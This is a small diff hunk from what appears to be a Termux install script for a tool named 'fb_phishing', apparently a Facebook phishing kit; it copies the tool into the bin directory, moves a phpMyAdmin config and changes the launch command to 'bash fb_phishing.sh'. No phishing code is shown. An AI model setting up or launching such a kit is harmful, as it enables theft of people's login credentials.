@@ -25,5 +25,4 @@ cp fb_phishing /data/data/com.termux/files/usr/bin
 mv config.inc2.php $PREFIX/share/phpmyadmin/config.inc.php
 
 clear
-
-./fb_phishing
+bash fb_phishing.sh
